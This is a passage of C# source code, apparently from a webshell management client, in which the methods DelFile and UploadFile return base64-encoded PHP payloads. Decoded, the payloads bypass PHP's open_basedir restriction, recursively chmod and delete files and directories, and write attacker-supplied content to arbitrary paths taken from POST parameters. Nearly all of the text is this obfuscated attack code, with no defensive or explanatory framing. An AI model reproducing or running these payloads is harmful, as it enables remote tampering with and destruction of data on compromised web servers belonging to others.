lbl9iYXNlZGlyIiwiLyIpO0BybWRpcigkdG1kaXIpO2JyZWFrO307fTs7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyBAYXNlbmMoJG91dHB1dCk7fW9iX3N0YXJ0KCk7dHJ5e2Z1bmN0aW9uIGRmKCRwKXskbT1AZGlyKCRwKTt3aGlsZShAJGY9JG0tPnJlYWQoKSl7JHBmPSRwLiIvIi4kZjtpZigoaXNfZGlyKCRwZikpJiYoJGYhPSIuIikmJigkZiE9Ii4uIikpe0BjaG1vZCgkcGYsMDc3Nyk7ZGYoJHBmKTt9aWYoaXNfZmlsZSgkcGYpKXtAY2htb2QoJHBmLDA3NzcpO0B1bmxpbmsoJHBmKTt9fSRtLT5jbG9zZSgpO0BjaG1vZCgkcCwwNzc3KTtyZXR1cm4gQHJtZGlyKCRwKTt9JEY9YmFzZTY0X2RlY29kZShnZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbImZpbGUiXSk6JF9QT1NUWyJmaWxlIl0pO2lmKGlzX2RpcigkRikpZWNobyhkZigkRikpO2Vsc2V7ZWNobyhmaWxlX2V4aXN0cygkRik/QHVubGluaygkRik/IjEiOiIwIjoiMCIpO307fWNhdGNoKEV4Y2VwdGlvbiAkZSl7ZWNobyAiRVJST1I6Ly8iLiRlLT5nZXRNZXNzYWdlKCk7fTthc291dHB1dCgpO2RpZSgpOw==";
            return DelFile;
        }
        /// <summary>
        /// 上传文件
        /// </summary>
        /// <returns></returns>
        public string UploadFile()
        {
            string UploadFile = "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjNhZjFhYTg4MWMiO0Bta2RpcigkdG1kaXIpO2lmKCFAZmlsZV9leGlzdHMoJHRtZGlyKSl7Y29udGludWU7fUBjaGRpcigkdG1kaXIpO0Bpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCAiLi4iKTskY250YXJyPUBwcmVnX3NwbGl0KCIvXFxcXHxcLy8iLCR0bWRpcik7Zm9yKCRpPTA7JGk8c2l6ZW9mKCRjbnRhcnIpOyRpKyspe0BjaGRpcigiLi4iKTt9O0Bpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCIvIik7QHJtZGlyKCR0bWRpcik7YnJlYWs7fTt9OztmdW5jdGlvbiBhc2VuYygkb3V0KXtyZXR1cm4gJG91dDt9O2Z1bmN0aW9uIGFzb3V0cHV0KCl7JG91dHB1dD1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTtlY2hvIEBhc2VuYygkb3V0cHV0KTt9b2Jfc3RhcnQoKTt0cnl7JGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbIkZpbGVQYXRoIl0pOyRjPSRfUE9TVFsiY29udGVudCJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJhIiksJGJ1Zik/IjEiOiIwIik7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+Z2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs=";
            return UploadFile;
        }
    }
}
